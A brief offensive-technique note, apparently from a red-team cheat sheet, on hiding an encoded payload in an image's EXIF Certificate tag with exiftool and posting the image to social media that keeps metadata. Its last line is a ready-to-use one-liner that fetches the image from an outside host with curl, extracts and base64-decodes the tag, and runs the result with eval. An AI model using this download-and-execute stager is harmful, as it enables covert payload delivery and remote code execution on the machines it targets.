# Insert Metadata

> [!TIP] Social Media as a Webserver
> You can use social media to upload images with a metadata if it doesn't strip when being uploaded.

```
$ exiftool -all= payload.jpg
```

Insert an encoded payload (e.g., `base64`).

```
$ exiftool -Certificate='<base64_payload>' payload.jpg
```

After uploading it from any third party website.

```bash
payload=$(curl -s https://website.com/payload.jpg | grep Cert -a | sed 's/<[^>]*>//g' | base64 -d);eval $payload
```
